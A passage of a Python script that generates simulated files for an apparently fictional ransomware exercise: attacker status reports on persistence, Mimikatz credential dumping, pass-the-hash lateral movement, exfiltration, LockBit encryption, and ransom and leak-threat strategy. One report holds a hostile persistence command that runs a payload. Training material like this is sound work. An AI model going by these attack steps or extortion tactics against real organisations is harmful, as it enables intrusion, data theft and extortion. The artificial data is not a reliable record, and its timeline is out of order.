-----------------
Total Beacons: 73
Successful: 73 (100%)
Failed: 0
Average Response Time: 45ms
Data Transferred: 2.3 MB (outbound), 1.2 MB (inbound)

RECOMMENDATION
--------------
C2 communication stable. Continue operations as planned.
No changes to beacon interval or encryption required.
"""
    with open(ARTIFACTS_DIR / "c2_status_phase1.txt", 'w') as f:
        f.write(content)
    print("Created: c2_status_phase1.txt")

def create_recon_results():
    """Create Red Team reconnaissance results."""
    content = """Network Reconnaissance Results
===============================
Scan Period: 2024-01-15 08:30:00 - 10:30:00 UTC
Source: WS-FIN-042 (192.168.0.42)
Status: COMPLETE

TARGETS IDENTIFIED
------------------
1. DC-01 (192.168.0.10)
   Type: Domain Controller
   OS: Windows Server 2019
   Open Ports: 53, 88, 135, 139, 445, 3389, 5985
   Services: Active Directory, DNS, Kerberos
   Priority: CRITICAL

2. FS-01 (192.168.0.20)
   Type: File Server
   OS: Windows Server 2019
   Open Ports: 135, 139, 445, 3389, 5985
   Shares Discovered:
     - \\FS-01\\Finance (12.5 GB, 1,234 files)
     - \\FS-01\\R&D\\Proprietary (450 MB, 156 files)
   Priority: HIGH

3. FS-02 (192.168.0.21)
   Type: File Server
   OS: Windows Server 2019
   Open Ports: 135, 139, 445, 3389, 5985
   Shares Discovered:
     - \\FS-02\\HR (8.2 GB, 856 files)
     - \\FS-02\\HR\\PII (4.1 GB, 342 files) - HIGHLY SENSITIVE
   Priority: HIGH

4. BACKUP-01 (192.168.0.30)
   Type: Backup Server
   OS: Windows Server 2019
   Open Ports: 135, 139, 445, 3389, 5985
   Backup Software: Veeam Backup & Replication
   Priority: CRITICAL

NETWORK TOPOLOGY
----------------
Subnet: 192.168.0.0/24
Total Hosts: 256
Active Hosts: 45
Scanned: 45 (100%)
Vulnerable Services: SMB (445), RDP (3389), WinRM (5985)

PERSISTENCE VERIFICATION
------------------------
✓ Scheduled Task: UpdateCheck - ACTIVE
✓ Registry Run Key: UpdateCheck - ACTIVE
✓ WMI Event Subscription: Created
✓ Service Creation: Attempted (requires admin)

All persistence mechanisms verified and operational.

NEXT PHASE OBJECTIVES
---------------------
1. Escalate privileges to domain admin
2. Harvest credentials from memory
3. Move laterally to identified targets
4. Access sensitive data shares
5. Compromise backup systems
"""
    with open(ARTIFACTS_DIR / "recon_results_phase2.txt", 'w') as f:
        f.write(content)
    print("Created: recon_results_phase2.txt")

def create_persistence_status():
    """Create Red Team persistence status."""
    content = """Persistence Mechanisms Status Report
=========================================
Target: WS-FIN-042
Verification Time: 2024-01-15 10:30:00 UTC
Status: ALL ACTIVE

DEPLOYED MECHANISMS
-------------------
1. Scheduled Task: UpdateCheck
   Location: Task Scheduler
   Trigger: Every 5 minutes
   Command: powershell.exe -File C:\\Users\\finance.user\\AppData\\Local\\Temp\\payload.dll
   Status: ✓ ACTIVE
   Last Run: 2024-01-15 10:28:15 UTC
   Next Run: 2024-01-15 10:33:15 UTC

2. Registry Run Key
   Location: HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run
   Value Name: UpdateCheck
   Value Data: C:\\Users\\finance.user\\AppData\\Local\\Temp\\payload.dll
   Status: ✓ ACTIVE
   Verified: YES

3. WMI Event Subscription
   Event Filter: ProcessStart
   Consumer: ActiveScriptEventConsumer
   Script: payload.dll
   Status: ✓ ACTIVE

4. Service Creation
   Service Name: SystemUpdate
   Attempted: YES
   Status: FAILED (requires admin privileges)
   Note: Will retry after privilege escalation

VERIFICATION RESULTS
---------------------
All active persistence mechanisms verified.
System will maintain access after:
- User logout: YES
- System reboot: YES
- Security tool removal: PARTIAL (WMI survives)

DETECTION STATUS
----------------
EDR Detection: NONE
SIEM Alerts: NONE
Manual Review: NONE

All persistence mechanisms remain undetected.

RECOMMENDATION
--------------
Persistence established successfully. Ready to proceed with
privilege escalation and lateral movement phases.
"""
    with open(ARTIFACTS_DIR / "persistence_status_phase2.txt", 'w') as f:
        f.write(content)
    print("Created: persistence_status_phase2.txt")

def create_credential_success():
    """Create Red Team credential harvesting success report."""
    content = """Credential Harvesting Success Report
=========================================
Target: WS-FIN-042
Time: 2024-01-15 10:45:23 UTC
Status: SUCCESS

TECHNIQUE USED
--------------
Method: Memory Dump (lsass.exe)
Tool: Mimikatz (in-memory execution)
Process: lsass.exe (PID: 512)
Result: Domain Admin credentials obtained

CREDENTIALS OBTAINED
--------------------
Username: svc_backup
Domain: CORP
Password Hash: [NTLM Hash]
LM Hash: [LM Hash]
SID: S-1-5-21-1234567890-123456789-123456789-1105

PRIVILEGES
----------
- Domain Admin
- Backup Operator
- Local Administrator (all systems)
- Service Account

ACCESS VERIFICATION
-------------------
DC-01 (Domain Controller):
  Status: ✓ ACCESS GRANTED
  Method: Pass-the-Hash
  Time: 2024-01-15 10:45:24 UTC

FS-01 (File Server):
  Status: ✓ ACCESS GRANTED
  Method: Pass-the-Hash
  Time: 2024-01-15 10:46:12 UTC

FS-02 (File Server):
  Status: ✓ ACCESS GRANTED
  Method: Pass-the-Hash
  Time: 2024-01-15 10:52:33 UTC

BACKUP-01 (Backup Server):
  Status: ✓ ACCESS GRANTED
  Method: Pass-the-Hash
  Time: 2024-01-15 11:15:47 UTC

ALL TARGET SYSTEMS ACCESSIBLE

NEXT STEPS
----------
- Begin lateral movement to file servers
- Access sensitive data shares
- Compromise backup systems
- Prepare for data exfiltration
"""
    with open(ARTIFACTS_DIR / "credential_success_phase3.txt", 'w') as f:
        f.write(content)
    print("Created: credential_success_phase3.txt")

def create_lateral_status():
    """Create Red Team lateral movement status."""
    content = """Lateral Movement Status Report
===============================
Period: 2024-01-15 10:46:00 - 11:30:00 UTC
Status: COMPLETE

SYSTEMS COMPROMISED
-------------------
1. DC-01 (Domain Controller)
   Access: FULL DOMAIN ADMIN
   Time: 2024-01-15 10:45:24 UTC
   Activities:
     ✓ SYSVOL accessed
     ✓ Group Policy enumeration complete
     ✓ Domain trust relationships mapped
   Status: OPERATIONAL

2. FS-01 (File Server)
   Access: FULL ADMIN
   Time: 2024-01-15 10:46:12 UTC
   Shares Accessed:
     ✓ \\FS-01\\Finance
       - Files Enumerated: 1,234
       - Directories: 45
       - Total Size: 12.5 GB
       - Access: READ/WRITE
     ✓ \\FS-01\\R&D\\Proprietary
       - Files Enumerated: 156
       - Directories: 12
       - Total Size: 450 MB
       - Access: READ/WRITE
   Status: OPERATIONAL

3. FS-02 (File Server)
   Access: FULL ADMIN
   Time: 2024-01-15 10:52:33 UTC
   Shares Accessed:
     ✓ \\FS-02\\HR
       - Files Enumerated: 856
       - Directories: 23
       - Total Size: 8.2 GB
       - Access: READ/WRITE
     ✓ \\FS-02\\HR\\PII
       - Files Enumerated: 342
       - Directories: 12
       - Total Size: 4.1 GB
       - Classification: HIGHLY SENSITIVE
       - Access: READ/WRITE
   Status: OPERATIONAL

4. BACKUP-01 (Backup Server)
   Access: FULL ADMIN
   Time: 2024-01-15 11:15:47 UTC
   Backup Catalog:
     ✓ System_Backup_2024-01-14: ACCESSIBLE
     ✓ Database_Backup_2024-01-14: ACCESSIBLE
     ✓ FileServer_Backup_2024-01-14: ACCESSIBLE
     ✓ Total Backup Files: 2,109
     ✓ Total Size: 1.2 TB
   Status: OPERATIONAL

DATA IDENTIFIED FOR EXFILTRATION
--------------------------------
- Customer Databases: 45 GB
- Financial Records: 120 GB
- Employee PII: 8.2 GB
- Intellectual Property: 105 GB
- Legal Documents: 85 GB
Total: 363.2 GB identified

DETECTION STATUS
----------------
Security Alerts: 0
SIEM Correlations: 0
Manual Detection: 0

All lateral movement completed without detection.

READY FOR DATA EXFILTRATION PHASE
"""
    with open(ARTIFACTS_DIR / "lateral_status_phase3.txt", 'w') as f:
        f.write(content)
    print("Created: lateral_status_phase3.txt")

def create_exfiltration_progress():
    """Create Red Team exfiltration progress."""
    content = """Data Exfiltration Progress Report
===================================
Period: 2024-01-15 11:00:00 - 17:00:00 UTC
Status: COMPLETE

TARGET SYSTEMS
--------------
FS-01 (File Server):
  Status: COMPLETE (100%)
  Data Transferred: 270 GB
  Transfer Rate: 45 GB/hour
  Duration: 6 hours
  Upload Destination: Mega.nz

FS-02 (File Server):
  Status: COMPLETE (100%)
  Data Transferred: 180 GB
  Transfer Rate: 30 GB/hour
  Duration: 6 hours
  Upload Destination: Dropbox

TOTAL DATA EXFILTRATED: 450 GB

DATA CATEGORIES COLLECTED
-------------------------
✓ Customer Databases: 45 GB
  - Records: 125,000
  - Estimated Value: $6.25M

✓ Financial Records: 120 GB
  - Q1-Q4 2023 Financials
  - Q1 2024 Financials
  - Budget Documents
  - Vendor Contracts

✓ Employee PII: 8.2 GB
  - Records: 2,400
  - Includes: SSNs, Salaries, Medical Records

✓ Intellectual Property: 105 GB
  - Proprietary Algorithms
  - Research Data
  - Patent Applications
  - Source Code

✓ Legal Documents: 85 GB
  - Contracts
  - NDAs
  - Compliance Records
  - Legal Correspondence

✓ System Backups: 87 GB
  - Recent backup sets
  - Configuration files

UPLOAD STATUS
-------------
Mega.nz: 270 GB uploaded ✓
Dropbox: 180 GB uploaded ✓
Total: 450 GB / 450 GB (100%)

VERIFICATION
------------
All data verified and accessible at upload destinations.
Data integrity: 100%
Encryption: AES-256 (at rest)

LEVERAGE ASSESSMENT
-------------------
Data Value: $50+ million
Regulatory Impact: HIGH
Publication Threat: CREDIBLE
Negotiation Position: STRONG

STATUS: EXFILTRATION COMPLETE
Ready for encryption deployment phase.
"""
    with open(ARTIFACTS_DIR / "exfiltration_progress_phase4.txt", 'w') as f:
        f.write(content)
    print("Created: exfiltration_progress_phase4.txt")

def create_stolen_data_inventory():
    """Create Red Team stolen data inventory."""
    content = """Stolen Data Inventory
=====================
Compilation Date: 2024-01-15 17:00:00 UTC
Total Data: 450 GB
Status: VERIFIED AND ARCHIVED

HIGH-VALUE DATA CATEGORIES
---------------------------

1. Customer PII Database
   Volume: 45 GB
   Records: 125,000
   Data Types:
     - Names, Addresses, Phone Numbers
     - Email Addresses
     - Credit Card Information (last 4 digits)
     - Purchase History
   Estimated Value: $6.25M ($50/record)
   Regulatory Impact: GDPR, CCPA

2. Financial Records
   Volume: 120 GB
   Contents:
     - Q1-Q4 2023 Financial Statements
     - Q1 2024 Financial Statements
     - Budget Forecasts
     - Vendor Payment Records
     - Tax Documents
   Estimated Value: $10M+ (competitive intelligence)

3. Employee Data
   Volume: 8.2 GB
   Records: 2,400
   Data Types:
     - Social Security Numbers
     - Salaries and Compensation
     - Medical Records
     - Background Check Results
     - Performance Reviews
   Estimated Value: $2.4M
   Regulatory Impact: HIPAA, GDPR

4. Intellectual Property
   Volume: 105 GB
   Contents:
     - Proprietary Algorithms
     - Research Data
     - Patent Applications
     - Source Code Repositories
     - Product Designs
   Estimated Value: $30M+ (competitive advantage)

5. Legal Documents
   Volume: 85 GB
   Contents:
     - Vendor Contracts
     - Non-Disclosure Agreements
     - Compliance Records
     - Legal Correspondence
     - Merger/Acquisition Documents
   Estimated Value: $5M+ (legal leverage)

6. System Backups
   Volume: 87 GB
   Contents:
     - Recent System Backups
     - Configuration Files
     - Database Dumps
   Estimated Value: $1M+ (operational intelligence)

TOTAL ESTIMATED VALUE: $50+ million

PUBLICATION STRATEGY
--------------------
If ransom not paid within 72 hours:
- Leak site publication scheduled
- Data categorized for maximum impact
- Customer notification threat
- Regulatory body notification threat

NEGOTIATION LEVERAGE
--------------------
✓ High-value data exfiltrated
✓ Regulatory violations exposed
✓ Competitive intelligence obtained
✓ Customer trust at risk
✓ Legal implications significant

STATUS: MAXIMUM LEVERAGE ACHIEVED
"""
    with open(ARTIFACTS_DIR / "stolen_data_inventory_phase4.txt", 'w') as f:
        f.write(content)
    print("Created: stolen_data_inventory_phase4.txt")

def create_encryption_status():
    """Create Red Team encryption deployment status."""
    content = """Ransomware Deployment Status Report
====================================
Deployment Time: 2024-01-15 14:30:00 UTC
Status: COMPLETE

ENCRYPTION STATISTICS
---------------------
Total Systems Encrypted: 200+
Encryption Rate: 100%
Ransomware Variant: LockBit 3.0
Encryption Algorithm: AES-256 + RSA-2048

SYSTEMS ENCRYPTED BY CATEGORY
-----------------------------
File Servers: 15/15 (100%)
  - FS-01: ENCRYPTED
  - FS-02: ENCRYPTED
  - [13 additional file servers]

Application Servers: 8/8 (100%)
  - ERP System: ENCRYPTED (OFFLINE)
  - CRM System: ENCRYPTED (OFFLINE)
  - Email Server: ENCRYPTED (PARTIAL)
  - [5 additional application servers]

Workstations: 150/150 (100%)
  - All Finance Department: ENCRYPTED
  - All HR Department: ENCRYPTED
  - All R&D Department: ENCRYPTED
  - [Additional workstations]

Backup Systems: 1/1 (100%)
  - BACKUP-01: ENCRYPTED
  - Onsite Backups: ENCRYPTED
  - Note: Offsite backups may exist (36 hours old)

Domain Controllers: 2/2 (100%)
  - DC-01: ENCRYPTED
  - DC-02: ENCRYPTED

RANSOM NOTE DEPLOYMENT
----------------------
Status: DEPLOYED
Systems: All encrypted systems
Message: LockBit 3.0 standard note
Bitcoin Address: [REDACTED]
Deadline: 72 hours from deployment
Contact: Tor .onion address provided

BUSINESS IMPACT
---------------
Critical Systems Offline:
  - ERP System: OFFLINE
  - Email Server: PARTIAL
  - Customer Portal: OFFLINE
  - File Shares: INACCESSIBLE

Estimated Revenue Loss: $500K/day
Recovery Time (if paying): 2-3 weeks
Recovery Time (if using backups): 48-72 hours (if available)

LEVERAGE POINTS
---------------
✓ All systems encrypted
✓ Onsite backups encrypted
✓ Business operations halted
✓ Data exfiltrated (450 GB)
✓ Data publication threat available

STATUS: MAXIMUM IMPACT ACHIEVED
Awaiting victim response and negotiation.
"""
    with open(ARTIFACTS_DIR / "encryption_status_phase5.txt", 'w') as f:
        f.write(content)
    print("Created: encryption_status_phase5.txt")

def create_negotiation_status():
    """Create Red Team negotiation status."""
    content = """Ransom Negotiation Status
==========================
Demand: 50 BTC (~$1.2M USD at current rates)
Deadline: 72 hours from deployment
Deployment Time: 2024-01-15 14:30:00 UTC
Deadline: 2024-01-18 14:30:00 UTC

COMMUNICATION CHANNEL
---------------------
Method: Tor .onion address
Status: OPERATIONAL
Encryption: End-to-end encrypted
Anonymity: Full (Tor network)

VICTIM RESPONSE STATUS
----------------------
Initial Contact: PENDING
Counter-Offer: PENDING
Payment Status: PENDING
Negotiation Progress: 0%

LEVERAGE ASSESSMENT
-------------------
Current Leverage: MAXIMUM

✓ All systems encrypted (200+)
✓ Onsite backups encrypted
✓ Data exfiltrated (450 GB)
✓ Business operations halted
✓ Data publication threat available
✓ Regulatory violations exposed

NEGOTIATION STRATEGY
--------------------
Phase 1 (0-24 hours): Wait for initial contact
Phase 2 (24-48 hours): Begin negotiation if contacted
Phase 3 (48-72 hours): Increase pressure, threaten publication
Phase 4 (72+ hours): Publish data if no payment

DATA PUBLICATION PLAN
----------------------
If ransom not paid:
- Leak site publication: READY
- Data categorized: YES
- Customer notification: PREPARED
- Regulatory notification: PREPARED
- Media release: PREPARED

PAYMENT TRACKING
----------------
Bitcoin Address: [REDACTED]
Blockchain: Monitoring active
Payment Received: 0 BTC
Payment Required: 50 BTC
Payment Deadline: 2024-01-18 14:30:00 UTC

RECOMMENDATION
--------------
Maintain communication channel.
Wait for victim to initiate contact.
Be prepared to negotiate if contacted.
Execute publication plan if deadline passes without payment.

STATUS: AWAITING VICTIM RESPONSE
"""
    with open(ARTIFACTS_DIR / "negotiation_status_phase5.txt", 'w') as f:
        f.write(content)
    print("Created: negotiation_status_phase5.txt")

def create_attack_summary():
    """Create Red Team attack summary."""
    content = """Attack Summary Report - Mission Accomplished
==========================================
Campaign: Ransomware Deployment
Target: CORP.LOCAL
Duration: 9 hours 15 minutes
Status: SUCCESS

TIMELINE
--------
08:15 UTC - Initial Access (Phishing email)
08:17 UTC - Payload Execution (PowerShell)
08:17 UTC - Persistence Established
08:30 UTC - Network Reconnaissance Begins
10:30 UTC - Reconnaissance Complete
10:45 UTC - Privilege Escalation (Domain Admin)
10:46 UTC - Lateral Movement Begins
11:30 UTC - Lateral Movement Complete
11:00 UTC - Data Exfiltration Begins
17:00 UTC - Data Exfiltration Complete (450 GB)
14:30 UTC - Ransomware Deployment
14:35 UTC - Encryption Complete (200+ systems)

RESULTS
-------
✓ Initial Access: SUCCESS
✓ Persistence: SUCCESS (4 mechanisms)
✓ Privilege Escalation: SUCCESS (Domain Admin)
✓ Lateral Movement: SUCCESS (4 critical systems)
✓ Data Exfiltration: SUCCESS (450 GB)
✓ Ransomware Deployment: SUCCESS (200+ systems)
✓ Backup Encryption: SUCCESS (onsite backups)

SYSTEMS COMPROMISED
-------------------
- Domain Controllers: 2/2
- File Servers: 15/15
- Application Servers: 8/8
- Workstations: 150/150
- Backup Systems: 1/1

DATA EXFILTRATED
----------------
Total: 450 GB
Categories:
  - Customer PII: 125,000 records
  - Financial Records: Complete Q1-Q4 2023, Q1 2024
  - Employee Data: 2,400 records
  - Intellectual Property: Proprietary algorithms, research
  - Legal Documents: Contracts, NDAs

Estimated Value: $50+ million

BUSINESS IMPACT
---------------
Revenue Loss: $500K/day
Systems Offline: 200+
Critical Services: ERP, Email, Customer Portal
Recovery Time: 48-72 hours (if backups available)
Recovery Time: 2-3 weeks (if paying ransom)

DETECTION EVASION
-----------------
EDR Alerts Triggered: 0
SIEM Correlations: 0
Manual Detection: 0
Security Response: DELAYED

All phases completed without detection until encryption phase.

NEGOTIATION STATUS
------------------
Demand: 50 BTC (~$1.2M USD)
Deadline: 72 hours
Payment Received: 0 BTC
Status: AWAITING VICTIM RESPONSE

LEVERAGE
--------
✓ All systems encrypted
✓ Backups encrypted
✓ Data exfiltrated
✓ Business operations halted
✓ Data publication threat available

Maximum leverage achieved.

FINAL STATUS
------------
Mission: ACCOMPLISHED
Impact: MAXIMUM
Detection: MINIMAL
Leverage: MAXIMUM

Ready for negotiation or data publication phase.
"""
    with open(ARTIFACTS_DIR / "attack_summary_phase5.txt", 'w') as f:
        f.write(content)
    print("Created: attack_summary_phase5.txt")

if __name__ == "__main__":
    print("Generating realistic artifact files...")
    print(f"Artifacts directory: {ARTIFACTS_DIR}\n")
    
    # Create Blue Team text files (defender perspective)
    print("Creating Blue Team artifacts (defender perspective)...")
    create_edr_alert()
    create_nmap_scan()
    create_c2_traffic()
    create_privilege_escalation()
    create_lateral_movement()
    create_exfiltration_traffic()
    create_backup_status()
    
    # Create Red Team text files (attacker perspective)
    print("\nCreating Red Team artifacts (attacker perspective)...")
    create_initial_access()
    create_c2_status()
    create_recon_results()
    create_persistence_status()
    create_credential_success()
    create_lateral_status()
    create_exfiltration_progress()
    create_stolen_data_inventory()
    create_encryption_status()
    create_negotiation_status()
    create_attack_summary()
    
    # Create image placeholders
    create_image_placeholder(
        "phishing_email_phase1.png",
        "Phishing Email Screenshot",
        "URGENT: Invoice Payment Required - Action Needed\n\nFrom: vendor-support@legitmate-vendor.com\nTo: finance.user@corp.local\n\nClick here to download invoice: secure-invoice-download.tk"
    )
    
    create_image_placeholder(
        "ransomware_note_phase5.png",
        "YOUR FILES HAVE BEEN ENCRYPTED",
        "LockBit 3.0 Ransomware\n\nTo decrypt your files, you must pay 50 BTC\nBitcoin Address: [REDACTED]\n\nYou have 72 hours to pay.\nAfter that, the price doubles.\n\nWe have also exfiltrated your data.\nIf you do not pay, we will publish it."
    )
    
    # Create PDF placeholders
    pdf_content = """Data Classification Report
========================

Exfiltrated Data Analysis:
- Customer PII: 125,000 records
- Employee Data: 2,400 records  
- Financial Records: Q1-Q4 2023, Q1 2024
- Intellectual Property: Proprietary algorithms, research data
- Legal Documents: Contracts, NDAs, compliance records

Regulatory Impact:
- GDPR: Potential violation
- CCPA: Notification required
- HIPAA: Potential violation
- PCI-DSS: Potential violation

Estimated Fines: $5-25 million
"""
    
    create_pdf_placeholder("data_classification_phase4.pdf", "Data Classification Report", pdf_content)
    
    impact_content = """Encryption Impact Assessment
===========================

Systems Encrypted: 200+ endpoints
- 15 file servers
- 8 application servers
- 150 workstations
- Backup system (BACKUP-01)

Critical Systems Affected:
- ERP system: OFFLINE
- Email server: PARTIAL
- Customer portal: OFFLINE

Recovery Options:
- Using backups: 48-72 hours
- Paying ransom: 2-3 weeks

Business Impact: $500K/day in lost revenue
"""
    
    create_pdf_placeholder("impact_assessment_phase5.pdf", "Encryption Impact Assessment", impact_content)
    
    print("\n✓ All artifacts generated!")
    print("\nNote: For actual PNG images and PDFs, install:")
    print("  pip install Pillow reportlab")
    print("\nThen re-run this script to generate real images/PDFs.")

